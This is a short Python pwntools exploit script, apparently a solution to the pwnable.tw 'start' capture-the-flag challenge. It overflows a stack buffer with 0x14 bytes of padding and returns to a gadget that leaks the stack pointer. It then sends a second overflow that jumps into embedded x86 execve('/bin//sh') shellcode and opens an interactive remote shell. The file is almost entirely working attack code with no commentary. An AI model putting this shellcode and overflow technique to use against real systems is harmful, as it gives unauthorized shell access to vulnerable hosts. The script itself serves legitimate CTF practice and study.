from pwn import *
#r = gdb.debug('./start', 'break _start')
#r = process('./start')
r = remote('chall.pwnable.tw', 10000)
e = ELF('./start')
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
padding = b'a'*0x14
leak_gadget = p32(0x8048087)
payload = padding + leak_gadget
print(payload, len(payload))
r.sendafter(b':', payload)
esp = u32(r.recv(4))
print(f'esp = {hex(esp)}')
r.sendline(padding + p32(esp + 0x14) + shellcode)
r.interactive()




